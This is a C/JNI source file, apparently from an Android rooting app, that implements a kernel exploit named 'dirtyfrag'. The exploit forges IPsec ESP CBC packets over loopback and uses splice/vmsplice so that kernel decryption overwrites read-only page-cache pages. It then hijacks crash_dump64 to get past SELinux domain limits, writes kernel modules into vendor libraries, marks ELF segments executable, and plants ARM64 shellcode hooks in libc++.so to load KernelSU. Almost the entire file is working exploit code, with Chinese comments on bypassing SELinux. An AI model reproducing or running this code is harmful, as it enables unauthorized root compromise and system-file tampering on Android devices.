#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <jni.h>
#include "reporter.h"
#include "aes256.h"
#include "hmac_sha256.h"

static jmethodID report_mid;

JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved __attribute__((unused))) {
    JNIEnv *env;
    (*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4);
    jclass clz = (*env)->FindClass(env, "df/root/IReporter");
    report_mid = (*env)->GetMethodID(env, clz, "report", "(Ljava/lang/String;)V");
    return JNI_VERSION_1_4;
}

struct PatchRestore {
    const char *lib;
    uint64_t shell_off;
    size_t   shell_padded;
    char    *shell_orig;   /* heap-allocated original shellcode bytes */
    uint64_t tramp_aligned;
    uint8_t  tramp_orig[16];
    /* 备用落位改过的 LOAD 段 p_flags。它不属于 payload/hook 的联锁
     * （「hook 未还原则拒还原 payload」不适用于它），独立记录独立还原。 */
    uint64_t pflags_foff;
    uint32_t pflags_orig;
    int      pflags_valid;
    int      valid;
};

void reportfmt(struct Reporter *r, const char *fmt, ...) {
    if (!r) return;
    va_list va; va_start(va, fmt);
    char buf[1024]; vsnprintf(buf, sizeof(buf), fmt, va);
    jstring s = (*r->env)->NewStringUTF(r->env, buf);
    (*r->env)->CallVoidMethod(r->env, r->obj, report_mid, s);
    (*r->env)->ExceptionClear(r->env);
    (*r->env)->DeleteLocalRef(r->env, s);
}

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
static char    *libcxx_ko_target;
static uint8_t *libcxx_soft_reboot;

/* SA parameters set by Java via nativeRunAll() before any patching. */
static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint8_t  g_hmac_key[32];
static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
static uint32_t g_seq = 1;   /* monotonically increasing per-write */

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 * crash_dump64 has been overwritten with splicehelper which supports argv[3]="r".
 */
static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *reporter) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { REPORTLN("创建管道失败：%s", strerror(errno)); return -1; }

    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);

    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) {
        REPORTLN("vfork 失败：%s", strerror(errno));
        close(rdpipe[0]); close(rdpipe[1]);
        return -1;
    }
    if (pid == 0) {
        close(rdpipe[0]);
        if (rdpipe[1] != 0) {
            if (dup2(rdpipe[1], 0) < 0) _exit(1);
            close(rdpipe[1]);
        }
        execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, "r", NULL);
        _exit(1);
    }
    close(rdpipe[1]);
    int status;
    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
    int n = 0;
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (n != 16) {
        if (WIFEXITED(status)) {
            static const char *const exit_meanings[] = {
                [0] = "成功",
                [1] = "打开 vendor 文件失败或读取不足 16 字节",
                [2] = "写管道返回不足 16 字节",
                [3] = "OUT_FD 不是管道（fd 疑被 SELinux 域转换清洗）",
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec < 4) ? exit_meanings[ec] : "未知";
            REPORTLN("read_vendor 在 0x%lx 仅得到 %d 字节：%s",
                     (long)offset, n, meaning);
        } else if (WIFSIGNALED(status)) {
            REPORTLN("read_vendor 在 0x%lx 仅得到 %d 字节（终止信号 %d）",
                     (long)offset, n, WTERMSIG(status));
        } else {
            REPORTLN("read_vendor 在 0x%lx 仅得到 %d 字节（状态码 0x%x）",
                     (long)offset, n, status);
        }
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
 * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 */
static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], const uint8_t old_content[16],
                            int use_helper, struct Reporter *reporter) {
    int ret = -1;

    int pfd[2];
    if (pipe(pfd) < 0) { REPORTLN("创建管道失败：%s", strerror(errno)); return -1; }
    fcntl(pfd[1], F_SETPIPE_SZ, 65536);

    /* ESP header: SPI(4) + seq(4) + IV(16) = 24 bytes */
    uint32_t seq = g_seq++;
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(seq);
    memcpy(hdr + 8, iv, 16);

    /* HMAC-SHA256 over ESP_hdr(8) || IV(16) || ciphertext(16) = 40 bytes */
    uint8_t hmac_msg[40];
    memcpy(hmac_msg,      hdr,         8);   /* SPI + seq */
    memcpy(hmac_msg + 8,  iv,          16);  /* IV */
    memcpy(hmac_msg + 24, old_content, 16);  /* ciphertext = file page */
    uint8_t hmac_full[32];
    hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);

    /* vmsplice header + IV (24 bytes) */
    struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pfd[1], &iov1, 1, SPLICE_F_GIFT) != 24) {
        REPORTLN("vmsplice 写入报文头失败：%s", strerror(errno)); goto out_pipe;
    }

    /* splice ciphertext from file (16 bytes, page-cache reference) */
    if (use_helper) {
        char offstr[24];
        snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
        if (pid < 0) { REPORTLN("vfork 失败：%s", strerror(errno)); goto out_pipe; }
        if (pid == 0) {
            if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) _exit(1);
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
            _exit(1);
        }
        int st;
        TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            REPORTLN("splice 助手进程执行失败，状态码=0x%x", st);
            goto out_pipe;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
            REPORTLN("splice 读取文件失败：%s", strerror(errno)); goto out_pipe;
        }
    }

    /* vmsplice ICV (truncated HMAC) */
    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
        REPORTLN("vmsplice 写入校验值 ICV 失败：%s", strerror(errno)); goto out_pipe;
    }

    /* splice pipe → UDP: 24 + 16 + icv_len bytes */
    {
        int total = 24 + 16 + g_icv_len;
        ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
        ret = (s == total) ? 0 : -1;
        if (ret) REPORTLN("splice 管道转 UDP 发送异常：实际 %zd 字节，预期 %d 字节", s, total);
    }

out_pipe:
    close(pfd[0]); close(pfd[1]);
    return ret;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content with pread().
 * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
 * len must be a multiple of 16.
 *
 * 这是**唯一**的文件写汇聚点。
 */
static int patch_file_cbc(const char *label, const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper, struct Reporter *reporter) {
    (void)label;
    if (len % 16 != 0) {
        REPORTLN("patch_file_cbc：数据长度 len=%zu 不是 16 的整数倍", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) {
        REPORTLN("创建 socket 失败：%s", strerror(errno));
        return -1;
    }
    {
        int opt = 1;
        setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        struct sockaddr_in src = {
            .sin_family = AF_INET,
            .sin_port   = htons((uint16_t)g_sender_port),
            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
        };
        if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
            REPORTLN("绑定发送端口 %d 失败：%s", g_sender_port, strerror(errno));
        struct sockaddr_in dst = {
            .sin_family = AF_INET,
            .sin_port   = htons((uint16_t)g_encap_port),
            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
        };
        if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            REPORTLN("connect 连接失败：%s", strerror(errno));
            close(sk_send); return -1;
        }
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            REPORTLN("打开文件 %s 失败：%s", path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (use_helper) {
            if (read_vendor_content(off, old_content, reporter) < 0) {
                rc = -1; break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                REPORTLN("在偏移 0x%lx 处预读文件失败：%s", (long)off, strerror(errno));
                rc = -1; break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(sk_send, file_fd, off, iv, old_content, use_helper, reporter) < 0) {
            REPORTLN("第 %zu 次写入（偏移 0x%lx）失败", i, (long)off);
            rc = -1; break;
        }

        if (i % 32 == 0)
            REPORTLN("已处理 %zu 字节 ...", i * 16);
    }

    if (!use_helper) close(file_fd);
    close(sk_send);
    if (rc == 0)
        REPORTLN("已成功向 %s（偏移 0x%zx）写入 %zu 字节补丁", path, foff, len);
    return rc;
}

/* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;
extern uint32_t libcxx_soft_reboot_off;

/* 两段式落位（自 v3.5 移植）：
 * 首选 exec 段尾；页窗塌缩时改选纯只读 LOAD 段并补 PF_X。 */
int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     uint64_t *payload_slack, uint64_t *next_seg_gap,
                     uint64_t min_payload,
                     uint64_t *pflags_foff, uint32_t *pflags_val);

asm(
    ".section .rodata\n"
    ".global dirtyfrag_ko_12_5_10_start\n.global dirtyfrag_ko_12_5_10_end\n"
    "dirtyfrag_ko_12_5_10_start:\n.incbin \"ko/dirtyfrag-android12-5.10.ko\"\ndirtyfrag_ko_12_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_10_start\n.global dirtyfrag_ko_13_5_10_end\n"
    "dirtyfrag_ko_13_5_10_start:\n.incbin \"ko/dirtyfrag-android13-5.10.ko\"\ndirtyfrag_ko_13_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_15_start\n.global dirtyfrag_ko_13_5_15_end\n"
    "dirtyfrag_ko_13_5_15_start:\n.incbin \"ko/dirtyfrag-android13-5.15.ko\"\ndirtyfrag_ko_13_5_15_end:\n"
    ".global dirtyfrag_ko_14_5_15_start\n.global dirtyfrag_ko_14_5_15_end\n"
    "dirtyfrag_ko_14_5_15_start:\n.incbin \"ko/dirtyfrag-android14-5.15.ko\"\ndirtyfrag_ko_14_5_15_end:\n"
    ".global dirtyfrag_ko_15_6_6_start\n.global dirtyfrag_ko_15_6_6_end\n"
    "dirtyfrag_ko_15_6_6_start:\n.incbin \"ko/dirtyfrag-android15-6.6.ko\"\ndirtyfrag_ko_15_6_6_end:\n"
    ".global dirtyfrag_ko_16_6_12_start\n.global dirtyfrag_ko_16_6_12_end\n"
    "dirtyfrag_ko_16_6_12_start:\n.incbin \"ko/dirtyfrag-android16-6.12.ko\"\ndirtyfrag_ko_16_6_12_end:\n"
    ".global dirtyfrag_ko_17_6_18_start\n.global dirtyfrag_ko_17_6_18_end\n"
    "dirtyfrag_ko_17_6_18_start:\n.incbin \"ko/dirtyfrag-android17-6.18.ko\"\ndirtyfrag_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dirtyfrag_ko_12_5_10_start[], dirtyfrag_ko_12_5_10_end[];
extern char dirtyfrag_ko_13_5_10_start[], dirtyfrag_ko_13_5_10_end[];
extern char dirtyfrag_ko_13_5_15_start[], dirtyfrag_ko_13_5_15_end[];
extern char dirtyfrag_ko_14_5_15_start[], dirtyfrag_ko_14_5_15_end[];
extern char dirtyfrag_ko_15_6_6_start[],  dirtyfrag_ko_15_6_6_end[];
extern char dirtyfrag_ko_16_6_12_start[], dirtyfrag_ko_16_6_12_end[];
extern char dirtyfrag_ko_17_6_18_start[], dirtyfrag_ko_17_6_18_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {12, 5, 10, dirtyfrag_ko_12_5_10_start, dirtyfrag_ko_12_5_10_end},
        {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
        {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
        {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
        {15, 6,  6, dirtyfrag_ko_15_6_6_start,  dirtyfrag_ko_15_6_6_end},
        {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
        {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
    };
    const struct KoImage *fb = NULL;
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
        if (imgs[i].android_release == andr) return &imgs[i];
        if (!fb) fb = &imgs[i];
    }
    return fb;
}

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    if (uname(&u) != 0) return -1;
    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
    const char *m = strstr(u.release, "android");
    if (!m) return -1;
    *andr = atoi(m + 7);
    return (*andr > 0) ? 0 : -1;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer.
 * Caller must free() the returned pointer.
 */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}


static int patch_ko(struct Reporter *reporter) {
    /* pick KO image */
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        REPORTLN("系统版本检查失败（可能是不受支持的 Non-GKI 设备）"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        REPORTLN("不支持的内核版本 %d.%d（Android %d）", major, minor, andr); return 1;
    }
    REPORTLN("* 选用内核模块：android%d-%d.%d（%d 字节）",
             ko->android_release, ko->kver_major, ko->kver_minor,
             (int)(ko->end - ko->start));

    /* patch #1: write splicehelper into crash_dump64 page cache.
     * After this, exec'ing kCrashDump runs our splicehelper in crash_dump
     * SELinux domain (exec transition on the path label) and can open vendor files. */
    size_t sh_len_padded;
    char *sh_buf = pad16(splice_helper_start,
                         (size_t)(splice_helper_end - splice_helper_start),
                         &sh_len_padded);
    if (!sh_buf) return -1;
    REPORTLN("* 补丁 #1：向 crash_dump64 写入 splicehelper（%zu 字节）", sh_len_padded);
        int ret = patch_file_cbc("crash_dump64:splicehelper", kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
    if (ret) { free(sh_buf); REPORTLN("补丁 #1 执行失败，错误码：%d", ret); return ret; }

    // Verify patch #1 actually landed in the page cache.
    // （上游 826c201 修正版：回读偏移 16，与 sh_buf+16 比对——专防 android14-6.1 假成功。）
    {
        uint8_t verify[16];
        int vfd = open(kCrashDump, O_RDONLY);
        if (vfd >= 0) {
            ssize_t n = pread(vfd, verify, 16, 16);
            close(vfd);
            if (n == 16 && memcmp(verify, sh_buf + 16, 16) != 0) {
                REPORTLN("补丁 #1 回读校验失败：页缓存未被修改");
                                free(sh_buf);
                return -1;
            }
            REPORTLN("补丁 #1 回读校验通过");
                    }
    }
    free(sh_buf);

    size_t ko_len_padded;
    char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
    if (!ko_buf) return -1;

    /* patch #2: write KO into vendor lib via crash_dump bridge */
    REPORTLN("* 补丁 #2：向 %s 写入 dirtyfrag.ko（%zu 字节）", libcxx_ko_target, ko_len_padded);
        ret = patch_file_cbc("vendor:ko", libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
    free(ko_buf);
    if (ret) REPORTLN("补丁 #2 执行失败，错误码：%d", ret);
    return ret;
}

#ifndef DF_PF_X
#define DF_PF_X 1u          /* PF_X 位；本文件未引入 <linux/elf.h>，仅需这一个位 */
#endif

/* 备用落位落在纯只读段时，把该 LOAD 段的 p_flags 补上 PF_X，使其加载后可执行。
 * （自 v3.5 移植）写原语以 16 字节 CBC 块为粒度，故按 16 字节对齐读块 →
 * 改其中 4 字节 → 整块写回。p_flags 在 Elf64_Phdr 内偏移 +4。
 * 改的是文件里的 phdr，只对此后新 exec 的进程生效——正是 hook 需要的语义。
 * 幂等：已是目标值则跳过。 */
static int patch_seg_exec(const char *path, uint64_t pflags_foff, uint32_t pflags_val,
                          struct Reporter *reporter, struct PatchRestore *restore) {
    if (pflags_foff == 0 || pflags_val == 0) return 0;   /* 首选落位：无需动权限 */

    uint64_t aligned = pflags_foff & ~(uint64_t)15;
    int pos = (int)(pflags_foff & 15);
    uint8_t blk[16];
    int fd = open(path, O_RDONLY);
    if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
        REPORTLN("读取 %s 的 p_flags 块失败", path);
        if (fd >= 0) close(fd);
        return -1;
    }
    close(fd);

    uint32_t cur;
    memcpy(&cur, &blk[pos], sizeof(cur));
    if (cur == pflags_val) {
        REPORTLN("[i] %s 的 p_flags 已是 0x%x，跳过（幂等）", path, pflags_val);
        return 0;
    }
    REPORTLN("* 落位在只读段：正在把 %s 的 p_flags 由 0x%x 补为 0x%x（文件偏移 0x%lx）",
             path, (unsigned)(pflags_val & ~(uint32_t)DF_PF_X), (unsigned)pflags_val,
             (unsigned long)pflags_foff);
    
    if (restore) {
        restore->pflags_foff  = pflags_foff;
        restore->pflags_orig  = cur;
        restore->pflags_valid = 1;
    }
    blk[pos+0] = (uint8_t)(pflags_val      );
    blk[pos+1] = (uint8_t)(pflags_val >>  8);
    blk[pos+2] = (uint8_t)(pflags_val >> 16);
    blk[pos+3] = (uint8_t)(pflags_val >> 24);
    return patch_file_cbc("segment:p_flags", path, (char *)blk, 16, (size_t)aligned, 0, reporter);
}

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy,
                      struct Reporter *reporter, struct PatchRestore *restore) {
    uint64_t hook_off, shell_off; uint32_t first_insn;
    uint64_t slack = 0, next_gap = 0, pflags_foff = 0; uint32_t pflags_val = 0;
    /* 落位硬界：入口 delta + pad16 后的长度（写入区间 [shell_off, shell_off+padded)） */
    uint32_t start_delta0 = (uint32_t)(stage_start - stage_data);
    uint32_t padded0 = (uint32_t)((stage_len + 15) & ~(size_t)15);
    uint64_t min_payload = (uint64_t)start_delta0 + (uint64_t)padded0;

    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn,
                         &slack, &next_gap, min_payload,
                         &pflags_foff, &pflags_val)) {
        REPORTLN("在 %s 中查找 hook 目标失败", lib); return 1;
    }
    REPORTLN("%s：hook 位置=0x%lx，shellcode 位置=0x%lx，长度=%u，页窗=%llu，下一段间距=%llu",
             lib, hook_off, shell_off, stage_len,
             (unsigned long long)slack, (unsigned long long)next_gap);
        if (pflags_foff != 0) {
        REPORTLN("* %s：exec 段尾页窗不足（%llu < %llu），改用只读 LOAD 段落位",
                 lib, (unsigned long long)slack, (unsigned long long)min_payload);
    }

    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);
    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        REPORTLN("%s 已经被 hook，跳过", lib); return 0;
    }
    uint32_t jmpback = BRANCH |
        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
    *(uint32_t *)&first_inst_copy[0] = first_insn;

    /* 备用落位：先补段权限，再写 payload，最后才写 hook 跳转——
     * 保证 hook 生效的那一刻 payload 与权限都已就位。 */
    if (patch_seg_exec(lib, pflags_foff, pflags_val, reporter, restore)) {
        REPORTLN("* 修改 %s 的段权限失败", lib);
        return -1;
    }

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) return -1;

    if (restore) {
        restore->lib = lib;
        restore->shell_off = shell_off;
        restore->shell_padded = padded;
        restore->shell_orig = malloc(padded);
        if (restore->shell_orig) {
            int rfd = open(lib, O_RDONLY);
            if (rfd < 0 || pread(rfd, restore->shell_orig, padded, (off_t)shell_off) != (ssize_t)padded) {
                free(restore->shell_orig); restore->shell_orig = NULL;
            }
            if (rfd >= 0) close(rfd);
        }
    }

    REPORTLN("* 正在向 %s 写入 shellcode", lib);
        int ret = patch_file_cbc("lib:shellcode", lib, buf, padded, shell_off, 0, reporter);
    free(buf);
    if (ret) { REPORTLN("* 向 %s 写入 shellcode 失败", lib); return ret; }

    {
        uint64_t aligned = hook_off & ~(uint64_t)15;
        int pos = (int)(hook_off & 15);
        uint8_t blk[16];
        int fd = open(lib, O_RDONLY);
        if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
            REPORTLN("读取 %s 的跳转指令块失败", lib); if (fd >= 0) close(fd); return -1;
        }
        close(fd);
        if (restore) {
            restore->tramp_aligned = aligned;
            memcpy(restore->tramp_orig, blk, 16);
            restore->valid = 1;
        }
        blk[pos+0] = (uint8_t)(hook_insn      );
        blk[pos+1] = (uint8_t)(hook_insn >>  8);
        blk[pos+2] = (uint8_t)(hook_insn >> 16);
        blk[pos+3] = (uint8_t)(hook_insn >> 24);
        REPORTLN("* 正在向 %s 写入跳转指令（位置 0x%lx）", lib, hook_off);
                ret = patch_file_cbc("lib:hook_insn", lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
    }
    return ret;
}

static void restore_hook(struct PatchRestore *r, struct Reporter *reporter) {
    if (!r->valid) return;
    REPORTLN("* 正在恢复 %s 中的跳转指令", r->lib);
    patch_file_cbc("restore:hook_insn", r->lib, (char *)r->tramp_orig, 16, (size_t)r->tramp_aligned, 0, reporter);
    if (r->shell_orig) {
        REPORTLN("* 正在恢复 %s 中的 shellcode", r->lib);
        patch_file_cbc("restore:shellcode", r->lib, r->shell_orig, r->shell_padded, (size_t)r->shell_off, 0, reporter);
    }
    /* 最后还原段权限——与写入顺序严格反序（hook → payload → p_flags）。
     * 它不参与「hook 未还原则拒还原 payload」的联锁：即使上面两步失败，
     * 权限也必须收回，否则该段会一直是可执行的。 */
    if (r->pflags_valid) {
        uint64_t aligned = r->pflags_foff & ~(uint64_t)15;
        int pos = (int)(r->pflags_foff & 15);
        uint8_t blk[16];
        int fd = open(r->lib, O_RDONLY);
        if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
            REPORTLN("* 读取 %s 的 p_flags 块失败，跳过权限还原", r->lib);
            if (fd >= 0) close(fd);
            return;
        }
        close(fd);
        blk[pos+0] = (uint8_t)(r->pflags_orig      );
        blk[pos+1] = (uint8_t)(r->pflags_orig >>  8);
        blk[pos+2] = (uint8_t)(r->pflags_orig >> 16);
        blk[pos+3] = (uint8_t)(r->pflags_orig >> 24);
        REPORTLN("* 正在恢复 %s 的段权限", r->lib);
        patch_file_cbc("restore:p_flags", r->lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
    }
}

static void fadvise_drop(const char *path, struct Reporter *reporter) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        REPORTLN("fadvise_drop 打开 %s 失败：%s", path, strerror(errno));
                return;
    }
    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
    close(fd);
    REPORTLN("* 已丢弃页面缓存：%s", path);
    }

static int createOrphanProcess(struct Reporter *reporter) {
        int pid = fork();
    if (pid < 0) {
        REPORTLN("fork 失败：%s", strerror(errno));
                return -1;
    }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
        return 0;
}

static int has_marker(const char *p) { return access(p, F_OK) == 0; }

JNIEXPORT jint JNICALL
Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
                                               jobject reporter_obj,
                                               jstring koTargetPath,
                                               jint encapPort, jint spi,
                                               jbyteArray aesCbcKey,
                                               jbyteArray hmacKey, jint icvLen,
                                               jint senderPort,
                                               jboolean softReboot,
                                               jboolean ksuNext) {
    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;

    g_encap_port  = (int)encapPort;
    g_sender_port = (int)senderPort;
    g_spi         = (uint32_t)spi;
    g_seq         = 1;
    g_icv_len     = (int)icvLen;

    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
    memcpy(g_aes_key, kb, 32);
    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);

    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
    memcpy(g_hmac_key, hb, 32);
    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);

    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
    const char *p = (*env)->GetStringUTFChars(env, koTargetPath, NULL);
    if (p) {
        strncpy(libcxx_ko_target, p, 63);
        libcxx_ko_target[63] = '\0';
        (*env)->ReleaseStringUTFChars(env, koTargetPath, p);
    }
    libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);

    /* 载荷开关字节：写进 libc++.so 的 shellcode 数据区，grandchild 读它决定
     * insmod 是否追加模块参数 `soft_reboot=1`。
     *
     * ★ 只此一个开关。dirtyfrag.ko 只声明了 module_param("soft_reboot")
     *   （证据：ko 的 .modinfo 仅有 "parmtype=soft_reboot:int"），因此这里
     *   不再向 insmod 传任何其它 key=val。
     *   「官方 / KernelSU-Next」双路不在此表达：它由 App 决定把哪个可执行入口
     *   暂存到 LKM 期望的 <DE>/ksud（官方 = 真 ksud 二进制；Next = 转发包装脚本），
     *   → ExploitRunner.stageFile / assets/ksud_next_wrap.sh。
     *   本参数仍由 ksuNext 之外的路径无差别传递，故两条路都能拿到 soft_reboot=1。 */
    *libcxx_soft_reboot = softReboot ? 1 : 0;

    REPORTLN("* 目标管理器：%s；软重启：%s",
             ksuNext ? "KernelSU-Next" : "KernelSU（官方）",
             softReboot ? "开" : "关");

    /* ── 软重启：两路的机制差异与 Next 路的补法 ────────────────────────────────
     * 官方 KSU：`ksud late-load ... --soft-reboot` 在**同一进程内**完成 ——
     *   objdump 实证 cli::run@0x30237c sleep(3) → @0x302380 bl soft_reboot。
     * KSU-Next：cli.rs 的 LateLoad 只有 allow_shell / kmi / package_name，没有该选项，
     *   所以 late-load 与 soft-reboot 天然是两次调用、两个进程。
     *
     * 直接后果（v4.6 上机实证）：由 dirtyfrag UMH shell（u:r:kernel:s0）发起的
     *   soft_reboot()，其 stop/start 经 property_service 被 SELinux 拒
     *   （`ctl.stop`/`ctl.start` ... Permission denied ⇒ exit status 1），
     *   system_server pid 不变 ⇒ 软重启没有真正发生。
     *
     * Next 路的补法（实现全部在 assets/ksud_next_wrap.sh）：
     *   借 KernelSU 自己的模块脚本通道 /data/adb/late-load.d/，让**已被
     *   escape_to_root_for_init() 改标成 u:r:ksu:s0 的 late-load 主进程**去执行 hook；
     *   hook 立刻返回并把动作交给 worker，worker 等 late-load 主进程真正退出、
     *   再 sleep 3 对齐官方时序，然后只发起一次 `ksud_next soft-reboot`。
     *   该域是 permissive 且 ksu_allow(ALL,ALL,ALL)，property_service 不再被拒。
     *   另有两处与官方对齐的修正（否则 LSPosed 起不来）：
     *     · 切进 init 挂载命名空间：/apex 才可达，app_process→lspd 不再
